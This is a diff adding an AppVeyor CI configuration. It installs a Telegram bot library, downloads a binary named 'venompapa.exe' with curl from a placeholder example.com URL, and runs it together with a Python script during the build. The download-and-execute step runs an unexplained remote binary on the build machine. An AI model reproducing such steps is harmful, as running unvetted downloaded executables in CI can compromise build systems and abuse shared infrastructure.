@@ -1,0 +1,32 @@
+# AppVeyor configuration file
+
+# Specify the environment
+environment:
+  matrix:
+    - PYTHON: "C:\\Python39"
+      PYTHON_VERSION: "3.9"
+
+# Install dependencies and setup
+install:
+  # Add Python to PATH
+  - set PATH=%PYTHON%;%PYTHON%\\Scripts;%PATH%
+  
+  # Verify Python installation
+  - python --version
+  
+  # Upgrade pip
+  - pip install --upgrade pip
+  
+  # Install required dependencies (like telebot)
+  - pip install pyTelegramBotAPI  # Install telebot library
+  
+  # Download or ensure the `venompapa` binary exists
+  - if not exist venompapa.exe curl -o venompapa.exe https://example.com/path/to/venompapa
+
+# Build script (main execution steps)
+build_script:
+  # Run the binary
+  - venompapa.exe
+  
+  # Execute the Python script
+  - python3 ven.py
